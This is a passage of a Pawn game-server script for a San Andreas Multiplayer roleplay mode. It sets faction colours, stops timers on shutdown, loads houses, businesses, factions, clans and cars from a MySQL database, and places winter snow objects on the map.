      	if(PlayerInfo[playerid][pMember] == 4) { SetPlayerColor(playerid, 0x18EBD6C8); } // Los Aztecas
      	if(PlayerInfo[playerid][pLeader] == 4) { SetPlayerColor(playerid, 0x18EBD6C8); } // Los Aztecas
      	if(PlayerInfo[playerid][pMember] == 5) { SetPlayerColor(playerid, 0x40863CAA); } // Grove Street
      	if(PlayerInfo[playerid][pLeader] == 5) { SetPlayerColor(playerid, 0x40863CAA); } // Grove Street
      	if(PlayerInfo[playerid][pMember] == 6) { SetPlayerColor(playerid, 0xFFAE00C8); } // Los Vagos
      	if(PlayerInfo[playerid][pLeader] == 6) { SetPlayerColor(playerid, 0xFFAE00C8); } // Los Vagos
      	if(PlayerInfo[playerid][pMember] == 8) { SetPlayerColor(playerid, 0x3754C8C8); } // LVPD
      	if(PlayerInfo[playerid][pLeader] == 8) { SetPlayerColor(playerid, 0x3754C8C8); } // LVPD
      	if(PlayerInfo[playerid][pMember] == 9) { SetPlayerColor(playerid, 0xEFC6FFFF); } // News Reporter
      	if(PlayerInfo[playerid][pLeader] == 9) { SetPlayerColor(playerid, 0xEFC6FFFF); } // News Reporter
      	if(PlayerInfo[playerid][pMember] == 10) { SetPlayerColor(playerid, 0xBD1CDEC8); } // Ballas
      	if(PlayerInfo[playerid][pLeader] == 10) { SetPlayerColor(playerid, 0xBD1CDEC8); } // Ballas
      	if(PlayerInfo[playerid][pMember] == 11) { SetPlayerColor(playerid, 0x7E3937FF); } // Hitman
      	if(PlayerInfo[playerid][pLeader] == 11) { SetPlayerColor(playerid, 0x7E3937FF); } // Hitman
      	if(PlayerInfo[playerid][pMember] == 12) { SetPlayerColor(playerid, 0x00D179FF); } // SI
      	if(PlayerInfo[playerid][pLeader] == 12) { SetPlayerColor(playerid, 0x00D179FF); } // SI
      	if(PlayerInfo[playerid][pMember] == 13) { SetPlayerColor(playerid, COLOR_YELLOW); } // TAXI
      	if(PlayerInfo[playerid][pLeader] == 13) { SetPlayerColor(playerid, COLOR_YELLOW); } // TAXI
      	if(PlayerInfo[playerid][pMember] == 14) { SetPlayerColor(playerid, 0xf86448FF); } // fireman
      	if(PlayerInfo[playerid][pLeader] == 14) { SetPlayerColor(playerid, 0xf86448FF); } // fireman
      	if(PlayerInfo[playerid][pPaintBallG] > 0) { SetPlayerColor(playerid, 0xff6464FF); } //Paintball
      	if(PlayerInfo[playerid][pMember] == 15) { SetPlayerColor(playerid, 0x371495C8); } // SFPD
    }
    return 1;
}

public GameModeInitExitFunc()
{
	foreach(Player,i)
	{
		if(IsPlayerConnected(i))
		{
			DisablePlayerCheckpoint(i);
			gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
		    SetPlayerCameraPos(i, 1460.0, -1324.0, 287.2);
		    SetPlayerCameraLookAt(i,1374.5, -1291.1, 239.0);
			gPlayerLogged[i] = 0;
		}
	}
	SetTimer("GameModeExitFunc", 4000, 0);
	return 1;
}

public GameModeExitFunc()
{
	KillTimer(findtimer);
	KillTimer(unjailtimer);
	KillTimer(othtimer);
	KillTimer(zerosec);
	KillTimer(flytimer);
	KillTimer(checkafktimer);
	KillTimer(cartimer);
	KillTimer(checkgastimer);
	KillTimer(checkvehinfotimer);
	KillTimer(productiontimer);
	KillTimer(spectatetimer);
	KillTimer(stoppedvehtimer);
	KillTimer(idletimer);
	KillTimer(pnstimer);
	KillTimer(wantedicatimer);
	KillTimer(savedatatimer);
	GameModeExit();
}

public OnGameModeExit()
{
    new qqerry[128];
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `users` SET `Status` = '0'");
    mysql_tquery(SQL,qqerry,"","");
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `friends` SET `Status` = '0'");
    mysql_tquery(SQL,qqerry,"","");
    mysql_close(SQL);
    return 1;
}

public LoadBizz()
{
    new PropertyString[1000];
	bussines = cache_num_rows();
	for(new i = 1; i <= bussines; i++)
	{
        new b = i - 1;
		BizzInfo[i][bID]                            = cache_get_field_content_int(b, "ID");
        BizzInfo[i][bOwned]							= cache_get_field_content_int(b, "Owned");
        cache_get_field_content(b, "Owner", BizzInfo[i][bOwner], SQL, 130);
        cache_get_field_content(b, "Message", BizzInfo[i][bMessage], SQL, 130);
   	    BizzInfo[i][bEntranceX]                     = cache_get_field_content_float(b, "EntranceX");
    	BizzInfo[i][bEntranceY]                     = cache_get_field_content_float(b, "EntranceY");
        BizzInfo[i][bEntranceZ]                     = cache_get_field_content_float(b, "EntranceZ");
        BizzInfo[i][bExitX]                         = cache_get_field_content_float(b, "ExitX");
        BizzInfo[i][bExitY]                         = cache_get_field_content_float(b, "ExitY");
        BizzInfo[i][bExitZ]                         = cache_get_field_content_float(b, "ExitZ");
        BizzInfo[i][bLevelNeeded]                   = cache_get_field_content_int(b, "LevelNeeded");
        BizzInfo[i][bBuyPrice]                      = cache_get_field_content_int(b, "BuyPrice");
        BizzInfo[i][bEntranceCost]                  = cache_get_field_content_int(b, "EntranceCost");
        BizzInfo[i][bTill]                          = cache_get_field_content_int(b, "Till");
        BizzInfo[i][bLocked]                        = cache_get_field_content_int(b, "Locked");
        BizzInfo[i][bInterior]                      = cache_get_field_content_int(b, "Interior");
        BizzInfo[i][bVirtual]                       = cache_get_field_content_int(b, "Virtual");
		BizzInfo[i][bSbiz]							= cache_get_field_content_int(b, "Sbiz");
		BizzInfo[i][bType]							= cache_get_field_content_int(b, "Type");
		if(BizzInfo[i][bOwned] == 0)
		{
			DestroyDynamic3DTextLabel(BizzLabel[i]);
			format(PropertyString, sizeof(PropertyString),"{357AB7}%s \n{FFFFFF}Business {357AB7}#%d \n{357AB7}This Business is for sale(/buybiz) ! \n {FFFFFF}Price: {357AB7}%s \n{FFFFFF}Level: {357AB7}%d",BizzInfo[i][bMessage],i,FormatNumber(BizzInfo[i][bBuyPrice]),BizzInfo[i][bLevelNeeded]);
			BizzLabel[i] = CreateDynamic3DTextLabel(PropertyString ,0x0066FFCC,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
			CreateDynamicPickup(1239, 1, BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]);
			pickups++;
		}
		else if(BizzInfo[i][bOwned] == 1)
		{
			DestroyDynamic3DTextLabel(BizzLabel[i]);
			format(PropertyString, sizeof(PropertyString),"{357AB7}%s \n{FFFFFF}Business {357AB7}#%d \n{FFFFFF}Owner: {357AB7}%s \n{FFFFFF}Fee: {357AB7}$%s",BizzInfo[i][bMessage],i,BizzInfo[i][bOwner],FormatNumber(BizzInfo[i][bEntranceCost]));
			BizzLabel[i] = CreateDynamic3DTextLabel(PropertyString ,0x0066FFCC,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ],25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
			CreateDynamicPickup(1239, 1, BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]);
			pickups++;
		}
		if(BizzInfo[i][bType] == 1) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],52,0,-1,-1,-1,750.0); //Bank
		if(BizzInfo[i][bType] == 2) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],18,0,-1,-1,-1,750.0); //GunShop
		if(BizzInfo[i][bType] == 3) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],49,0,-1,-1,-1,750.0); //Bars
		if(BizzInfo[i][bType] == 4) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],38,0,-1,-1,-1,750.0); //Sex Shop
		if(BizzInfo[i][bType] == 5) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],25,0,-1,-1,-1,750.0); //Casino
		if(BizzInfo[i][bType] == 6) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],17,0,-1,-1,-1,750.0); //24/7
		if(BizzInfo[i][bType] == 7) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],10,0,-1,-1,-1,750.0); //Burger Shot
		if(BizzInfo[i][bType] == 8) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],54,0,-1,-1,-1,750.0); //Gym
		if(BizzInfo[i][bType] == 9) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],29,0,-1,-1,-1,750.0); //Pizza
		if(BizzInfo[i][bType] == 10) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],51,0,-1,-1,-1,750.0); //Rent Car
		if(BizzInfo[i][bType] == 11) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],45,0,-1,-1,-1,750.0); //buyclothes
		if(BizzInfo[i][bType] == 12) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],27,0,-1,-1,-1,750.0); //Gas Station
		if(BizzInfo[i][bType] == 13) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],63,0,-1,-1,-1,750.0); //PNS
		if(BizzInfo[i][bType] == 14) CreateDynamicMapIcon(BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ],14,0,-1,-1,-1,750.0); //Cluckin Bell
	}
	printf("Bussines: %d", bussines);
}

public LoadTurfs()
{
	new string[256],idx;
	format(string, sizeof(string), "SELECT * FROM `turfs`");
	mysql_query(SQL, string);
	mysql_store_result();
	while(mysql_retrieve_row())
	{
	    idx++;
	    mysql_fetch_field_row(string, "ID"); TurfInfo[idx][zID] = strval(string);
	 	mysql_fetch_field_row(string, "Owned"); TurfInfo[idx][zOwned] = strval(string);
	 	mysql_fetch_field_row(string, "MinX"); TurfInfo[idx][zMinX] = floatstr(string);
	 	mysql_fetch_field_row(string, "MinY"); TurfInfo[idx][zMinY] = floatstr(string);
	 	mysql_fetch_field_row(string, "MaxX"); TurfInfo[idx][zMaxX] = floatstr(string);
	 	mysql_fetch_field_row(string, "MaxY"); TurfInfo[idx][zMaxY] = floatstr(string);
		turfsss++;
	}
	mysql_free_result();
	printf("Turfs: %d", turfsss);
	return 1;
}

public LoadDynamicFactions()
{
	factionss = cache_num_rows();
    for(new i = 1; i <= factionss; i++)
    {
		new f = i - 1;
		DynamicFactions[i][fID]                 = cache_get_field_content_int(f, "ID");
        cache_get_field_content(f, "Name", DynamicFactions[i][fName], SQL, 130);
		DynamicFactions[i][fcX]                 = cache_get_field_content_float(f, "X");
   	    DynamicFactions[i][fcY]                 = cache_get_field_content_float(f, "Y");
    	DynamicFactions[i][fcZ]                 = cache_get_field_content_float(f, "Z");
    	DynamicFactions[i][fMats]               = cache_get_field_content_int(f, "Mats");
    	DynamicFactions[i][fDrugs]              = cache_get_field_content_int(f, "Drugs");
    	DynamicFactions[i][fBank]               = cache_get_field_content_int(f, "Bank");
    	DynamicFactions[i][fPaydayMoney]        = cache_get_field_content_int(f, "PaydayMoney");
        cache_get_field_content(f, "Anunt", DynamicFactions[i][fAnn], SQL, 130);
    	DynamicFactions[i][fWin]                = cache_get_field_content_int(f, "Win");
    	DynamicFactions[i][fLost]               = cache_get_field_content_int(f, "Lost");
    	DynamicFactions[i][fMaxMembers]         = cache_get_field_content_int(f, "MaxMembers");
		DynamicFactions[i][fMinLevel]         	= cache_get_field_content_int(f, "MinLevel");
    	DynamicFactions[i][fApplication]        = cache_get_field_content_int(f, "Application");
		cache_get_field_content(f, "Rank1", DynamicFactions[i][fRankName1], SQL, 130);
		cache_get_field_content(f, "Rank2", DynamicFactions[i][fRankName2], SQL, 130);
		cache_get_field_content(f, "Rank3", DynamicFactions[i][fRankName3], SQL, 130);
		cache_get_field_content(f, "Rank4", DynamicFactions[i][fRankName4], SQL, 130);
		cache_get_field_content(f, "Rank5", DynamicFactions[i][fRankName5], SQL, 130);
		cache_get_field_content(f, "Rank6", DynamicFactions[i][fRankName6], SQL, 130);
		cache_get_field_content(f, "Rank7", DynamicFactions[i][fRankName7], SQL, 130);
	}
	printf("Dynamic Factions: %d", factionss);
	return 1;
}
/*public LoadFurnitures()
{
	new Cache: result12 = mysql_query (SQL, "SELECT * FROM `housefurnitures` ORDER BY `housefurnitures`.`ID` ASC");
    new index;
    new result[1000];
    new data[e_furniture];
    new virtualworld,furnitureint,id;
    for ( new i, j = cache_get_row_count ( ); i != j; ++i )
    {
       	index++;
       	cache_get_field_content(i,"ID", result);                        data[SQLID] = strval(result);
       	cache_get_field_content(i,"HouseID", result);                   data[HouseIDF] = strval(result);
      	cache_get_field_content(i,"FurnitureID", result);               data[ArrayID] = strval(result);
        cache_get_field_content(i,"FurnitureX", result);                data[furnitureX] = floatstr(result);
        cache_get_field_content(i,"FurnitureY", result);                data[furnitureY] = floatstr(result);
        cache_get_field_content(i,"FurnitureZ", result);                data[furnitureZ] = floatstr(result);
        cache_get_field_content(i,"FurnitureRX", result);               data[furnitureRX] = floatstr(result);
        cache_get_field_content(i,"FurnitureRY", result);               data[furnitureRY] = floatstr(result);
        cache_get_field_content(i,"FurnitureRZ", result);               data[furnitureRZ] = floatstr(result);
        cache_get_field_content(i,"FurnitureVW", result);              	virtualworld = strval(result);
        cache_get_field_content(i,"FurnitureInt", result);              furnitureint = strval(result);

        id = CreateDynamicObject(HouseFurnitures[data[ArrayID]][ModelID],
       			data[furnitureX], data[furnitureY], data[furnitureZ],
          		data[furnitureRX], data[furnitureRY], data[furnitureRZ],
				virtualworld,furnitureint);

		Streamer_SetArrayData(STREAMER_TYPE_OBJECT, id, E_STREAMER_EXTRA_ID, data);

   	}
   	cache_delete (result12);
    printf("[script] %d Furnitures loaded.", index);
	return 1;
}*/
public LoadClanInfo()
{
    new Cache: result12 = mysql_query (SQL, "SELECT * FROM `clans` WHERE `clanID` > '0' ORDER BY `clanID`");
    printf("Se incarca clanurile...");
    new i;
	new rezultate = cache_get_row_count();
    for(new x; x < MAX_CLANS; x++)
    {
		if(rezultate >= x)
		{
			i										= cache_get_field_content_int(x, "clanID");
			if(i != 0)
			{
				ClanInfo[i][cClanExpire]              	= cache_get_field_content_int(x, "clanExpire");
				ClanInfo[i][cClanActive]              	= cache_get_field_content_int(x, "clanActive");
				ClanInfo[i][cClanSlots]              	= cache_get_field_content_int(x, "clanSlots");
				ClanInfo[i][cClanVerificat]             = cache_get_field_content_int(x, "ClanVerificat");
				ClanInfo[i][cClanScor]             = cache_get_field_content_int(x, "ClanScor");
				ClanInfo[i][cConectari]             = cache_get_field_content_int(x, "Conectari");
				cache_get_field_content(x, "clanName", ClanInfo[i][cClanName], SQL, 130);
				cache_get_field_content(x, "clanColor", ClanInfo[i][cClanColor], SQL, 130);
				cache_get_field_content(x, "clanMOTD", ClanInfo[i][cClanMOTD], SQL, 250);
				cache_get_field_content(x, "clanTag", ClanInfo[i][cClanTag], SQL, 130);
				cache_get_field_content(x, "clanRankName7", ClanInfo[i][cClanRankName7], SQL, 130);
				cache_get_field_content(x, "clanRankName6", ClanInfo[i][cClanRankName6], SQL, 130);
				cache_get_field_content(x, "clanRankName5", ClanInfo[i][cClanRankName5], SQL, 130);
				cache_get_field_content(x, "clanRankName4", ClanInfo[i][cClanRankName4], SQL, 130);
				cache_get_field_content(x, "clanRankName3", ClanInfo[i][cClanRankName3], SQL, 130);
				cache_get_field_content(x, "clanRankName2", ClanInfo[i][cClanRankName2], SQL, 130);
				cache_get_field_content(x, "clanRankName1", ClanInfo[i][cClanRankName1], SQL, 130);
				printf("ID/NUME: %d: %s",i,ClanInfo[i][cClanName]);
				clanss = i;
			}
		}	
	}
	cache_delete(result12);
	printf("Last Clan ID: %d", clanss);
}
public LoadStock()
{
	stockss = cache_num_rows();
    for(new i = 1; i <= stockss; i++)
    {
		new s = i - 1;
		Stock[i][vID]                               = cache_get_field_content_int(s, "ID");
		Stock[i][vStock]                            = cache_get_field_content_int(s, "Stock");
		Stock[i][vPrice]                            = cache_get_field_content_int(s, "Price");
		Stock[i][vModel]                            = cache_get_field_content_int(s, "vid");
		Stock[i][vSpeed]                            = cache_get_field_content_int(s, "speed");
		cache_get_field_content(s, "Car", Stock[i][vName], SQL, 130);
	}
	printf("Stocks: %d", stockss);
}

public LoadCar()
{
	new i;
	new rezultate = cache_get_row_count();
    for(new c; c <= sizeof(CarInfo); c++)
    {
		if(rezultate >= c)
		{
			i                            = cache_get_field_content_int(c, "ID");
			if(i != 0)
			{
				CarInfo[i][cModel]                          = cache_get_field_content_int(c, "Model");
				CarInfo[i][cLocationx]                      = cache_get_field_content_float(c, "Locationx");
				CarInfo[i][cLocationy]                      = cache_get_field_content_float(c, "Locationy");
				CarInfo[i][cLocationz]                      = cache_get_field_content_float(c, "Locationz");
				CarInfo[i][cAngle]                          = cache_get_field_content_float(c, "Angle");
				CarInfo[i][cColorOne]                       = cache_get_field_content_int(c, "ColorOne");
				CarInfo[i][cColorTwo]                       = cache_get_field_content_int(c, "ColorTwo");
				cache_get_field_content(c, "Owner", CarInfo[i][cOwner], SQL, 130);
				CarInfo[i][cValue]                          = cache_get_field_content_int(c, "Value");
				cache_get_field_content(c, "License", CarInfo[i][cLicense], SQL, 130);
				cache_get_field_content(c, "Description", CarInfo[i][cDescription], SQL, 130);
				CarInfo[i][cLock]                          	= cache_get_field_content_int(c, "Lockk");
				CarInfo[i][cNewEngine]                      = cache_get_field_content_int(c, "NewEngine");
				CarInfo[i][cTimed]                          = cache_get_field_content_int(c, "Timed");
				CarInfo[i][cInscarprice]                    = cache_get_field_content_int(c, "Inscarprice");
				CarInfo[i][cInsurancecar]                   = cache_get_field_content_int(c, "Insurancecar");
				CarInfo[i][cKM]                             = cache_get_field_content_float(c, "KM");
				CarInfo[i][cHP]                             = cache_get_field_content_float(c, "HP");
				CarInfo[i][cDamage1]                        = cache_get_field_content_int(c, "Damage1");
				CarInfo[i][cDamage2]                        = cache_get_field_content_int(c, "Damage2");
				CarInfo[i][cDamage3]                        = cache_get_field_content_int(c, "Damage3");
				CarInfo[i][cDamage4]                        = cache_get_field_content_int(c, "Damage4");
				CarInfo[i][cGas]                        	= cache_get_field_content_int(c, "Gas");
				CarInfo[i][cOwned]                          = cache_get_field_content_int(c, "Owned");
				CarInfo[i][cSell]                           = cache_get_field_content_int(c, "Sell");
				CarInfo[i][mod1]                            = cache_get_field_content_int(c, "mod1");
				CarInfo[i][mod2]                            = cache_get_field_content_int(c, "mod2");
				CarInfo[i][mod3]                            = cache_get_field_content_int(c, "mod3");
				CarInfo[i][mod4]                            = cache_get_field_content_int(c, "mod4");
				CarInfo[i][mod5]                            = cache_get_field_content_int(c, "mod5");
				CarInfo[i][mod6]                            = cache_get_field_content_int(c, "mod6");
				CarInfo[i][mod7]                            = cache_get_field_content_int(c, "mod7");
				CarInfo[i][mod8]                            = cache_get_field_content_int(c, "mod8");
				CarInfo[i][mod9]                            = cache_get_field_content_int(c, "mod9");
				CarInfo[i][mod10]                           = cache_get_field_content_int(c, "mod10");
				CarInfo[i][mod11]                           = cache_get_field_content_int(c, "mod11");
				CarInfo[i][mod12]                           = cache_get_field_content_int(c, "mod12");
				CarInfo[i][mod13]                           = cache_get_field_content_int(c, "mod13");
				CarInfo[i][mod14]                           = cache_get_field_content_int(c, "mod14");
				CarInfo[i][mod15]                           = cache_get_field_content_int(c, "mod15");
				CarInfo[i][mod16]                           = cache_get_field_content_int(c, "mod16");
				CarInfo[i][mod17]                           = cache_get_field_content_int(c, "mod17");
				CarInfo[i][cDays]                           = cache_get_field_content_int(c, "days");
				CarInfo[i][cPaintJ]                         = cache_get_field_content_int(c, "PaintJ");
				CarInfo[i][vArma1]                          = cache_get_field_content_int(c, "Arma1");
				CarInfo[i][vArma2]                          = cache_get_field_content_int(c, "Arma2");
				CarInfo[i][vArma3]                          = cache_get_field_content_int(c, "Arma3");
				CarInfo[i][vGArma1]                         = cache_get_field_content_int(c, "GArma1");
				CarInfo[i][vGArma2]                         = cache_get_field_content_int(c, "GArma2");
				CarInfo[i][vGArma3]                         = cache_get_field_content_int(c, "GArma3");
				CarInfo[i][vDroguri]                        = cache_get_field_content_int(c, "Droguri");
				CarInfo[i][vBani]                        	= cache_get_field_content_int(c, "Bani");
				masini = i;
			}
		}	
	}
	printf("Ultimul ID incarcat din tabelul `cars`: %d", masini);
}

public LoadProperty()
{
	housess = cache_num_rows();
	for(new i = 1; i <= housess; i++)
    {
		new h = i - 1;
		HouseInfo[i][hID]                           = cache_get_field_content_int(h, "ID");
   	    HouseInfo[i][hEntrancex]                    = cache_get_field_content_float(h, "Entrancex");
    	HouseInfo[i][hEntrancey]                    = cache_get_field_content_float(h, "Entrancey");
        HouseInfo[i][hEntrancez]                    = cache_get_field_content_float(h, "Entrancez");
        HouseInfo[i][hExitx]                        = cache_get_field_content_float(h, "Exitx");
        HouseInfo[i][hExity]                        = cache_get_field_content_float(h, "Exity");
        HouseInfo[i][hExitz]                        = cache_get_field_content_float(h, "Exitz");
        cache_get_field_content(h, "Owner", HouseInfo[i][hOwner], SQL, 130);
        cache_get_field_content(h, "Discription", HouseInfo[i][hDiscription], SQL, 130);
        HouseInfo[i][hValue]						= cache_get_field_content_int(h, "Value");
        HouseInfo[i][hHel]                          = cache_get_field_content_int(h, "Hel");
        HouseInfo[i][hArm]                          = cache_get_field_content_int(h, "Arm");
        HouseInfo[i][hInterior]                     = cache_get_field_content_int(h, "Interior");
        HouseInfo[i][hLock]                         = cache_get_field_content_int(h, "Lockk");
        HouseInfo[i][hOwned]                        = cache_get_field_content_int(h, "Owned");
        HouseInfo[i][hRent]                         = cache_get_field_content_int(h, "Rent");
        HouseInfo[i][hRentabil]                     = cache_get_field_content_int(h, "Rentabil");
        HouseInfo[i][hTakings]                      = cache_get_field_content_int(h, "Takings");
        HouseInfo[i][hLevel]                        = cache_get_field_content_int(h, "Level");
        HouseInfo[i][hVirtual]                      = cache_get_field_content_int(h, "Virtual");
	}
	for(new i = 1; i <= housess; i++)
	{
		OnPropTextdrawUpdate(1, i);
	}
	printf("Houses: %d", housess);
}

public LoadSystems()
{
    new query[128];
    mysql_format(SQL, query, sizeof(query), "SELECT * FROM `houses`");
	mysql_tquery(SQL, query, "LoadProperty", "");

	mysql_format(SQL, query, sizeof(query), "SELECT * FROM `bizz`");
	mysql_tquery(SQL, query, "LoadBizz", "");

	LoadTurfs();
	for(new i = 0; i < sizeof(TurfInfo); i++)
	{
     	Turfs[i] = GangZoneCreateEx(TurfInfo[i][zMinX],TurfInfo[i][zMinY],TurfInfo[i][zMaxX],TurfInfo[i][zMaxY],TurfInfo[i][zID],1.0);
	}

	mysql_format(SQL, query, sizeof(query), "SELECT * FROM `factions`");
	mysql_tquery(SQL, query, "LoadDynamicFactions", "");

	LoadClanInfo();

	mysql_format(SQL, query, sizeof(query), "SELECT * FROM `cars`");
	mysql_tquery(SQL, query, "LoadCar", "");

	mysql_format(SQL, query, sizeof(query), "SELECT * FROM `stock`");
	mysql_tquery(SQL, query, "LoadStock", "");
	//LoadFurnitures();
}

stock CheckPlayerDistanceToVehicle(Float:radi, playerid, vehicleid)
{
	if(IsPlayerConnected(playerid))
	{
	    new Float:PX,Float:PY,Float:PZ,Float:X,Float:Y,Float:Z;
	    GetPlayerPos(playerid,PX,PY,PZ);
	    GetVehiclePos(vehicleid, X,Y,Z);
	    new Float:Distance = (X-PX)*(X-PX)+(Y-PY)*(Y-PY)+(Z-PZ)*(Z-PZ);
	    if(Distance <= radi*radi)
	    {
	        return 1;
	    }
	}
	return 0;
}
stock AddSnowObject(modelid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new objectsnow = CreateDynamicObject(modelid, x + 0.05, y + 0.075, z + 0.1, rx, ry, rz, -1, -1, -1, 300.0, 0.0);
	for(new a = 0; a < 30; a++)
	{
		SetDynamicObjectMaterial(objectsnow, a, 17944, "lngblok_lae2", "white64bumpy", 0);
	}	
	return objectsnow;
}
stock SetWorldTimeEx(ora)
{
	if(iarna == 1)
	{
		new ora2 = ora + 5;
		if(ora >= 1 && ora <= 6)
		{
			ora2 = 1;
		}
		SetWorldTime(ora2);
	}
	else
	{
		SetWorldTime(ora);
	}	
	return 1;
}
stock AddSnowObjects()
{
	AddSnowObject(5145, 2716.79687, -2447.87500, 2.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(16209, 205.4922, 1730.3516, 17.8281, 000.0000, 000.0000, 000.0000);
	AddSnowObject(5146, 2498.19531, -2408.00781, 1.80468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5147, 2533.76562, -2330.82812, 22.19531, 0.00000, 0.00000, 315.00000);
	AddSnowObject(3753, 2702.39843, -2324.25781, 3.03906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5333, 2374.38281, -2171.46875, 21.17968, 0.00000, 0.00000, 135.00000);
	AddSnowObject(5191, 2381.44531, -2397.43750, 6.67187, 0.00000, 0.00000, 45.00000);
	AddSnowObject(5176, 2521.53906, -2606.95312, 17.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3753, 2615.10937, -2464.61718, 3.03906, 0.00000, 0.00000, 180.00000);
	AddSnowObject(3753, 2748.01562, -2571.59375, 3.03906, 0.00000, 0.00000, 180.00000);
	AddSnowObject(5115, 2523.40625, -2217.46093, 12.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3753, 2511.47656, -2256.03125, 3.03906, 0.00000, 0.00000, 180.00000);
	AddSnowObject(5108, 2333.55468, -2308.71093, 3.27343, 0.00000, 0.00000, 45.00000);
	AddSnowObject(5353, 2543.75000, -2163.78906, 14.20312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5250, 2743.43750, -2120.64062, 15.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5184, 2699.03125, -2227.74218, 31.42968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5114, 2831.68750, -2161.52343, 5.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5125, 2397.82031, -2183.05468, 15.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5124, 2278.89843, -2286.31250, 15.33593, 0.00000, 0.00000, 45.00000);
	AddSnowObject(3753, 2299.18750, -2405.39843, 3.03906, 0.00000, 0.00000, 225.00000);
	AddSnowObject(3753, 2368.16406, -2523.86718, 3.03906, 0.00000, 0.00000, 90.00000);
	AddSnowObject(3753, 2454.82812, -2702.91406, 3.03906, 0.00000, 0.00000, 180.00000);
	AddSnowObject(5109, 2219.33593, -2558.80468, 4.98437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4844, 2086.57031, -2733.68750, 1.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4841, 2123.78906, -2576.32812, 15.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5003, 2018.43750, -2585.50000, 18.78125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4864, 1996.06250, -2677.55468, 14.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4822, 2179.89843, -2407.41406, 15.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5004, 2030.14062, -2417.69531, 12.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4867, 1780.80468, -2604.14062, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4847, 1710.74218, -2745.40625, 3.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4842, 1383.79687, -2707.74218, 3.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4863, 1533.08593, -2677.43750, 11.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4865, 1515.40625, -2602.50781, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4843, 1274.56250, -2551.86718, 3.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4839, 1383.60937, -2633.05468, 15.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4883, 1339.23437, -2456.69531, 15.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4866, 1517.15625, -2449.64843, 12.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4816, 1210.71093, -2467.78906, 1.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4840, 1233.50000, -2438.00000, 8.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4845, 1222.82812, -2291.23437, 7.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4835, 1466.76562, -2286.43750, 16.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4838, 1411.57812, -2265.07031, 12.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4834, 1315.84375, -2286.33593, 13.43750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4833, 1528.74218, -2252.64062, 12.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4871, 1569.93750, -2378.24218, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4831, 1756.08593, -2286.50000, 16.39843, 0.00000, 0.00000, 0.00000);
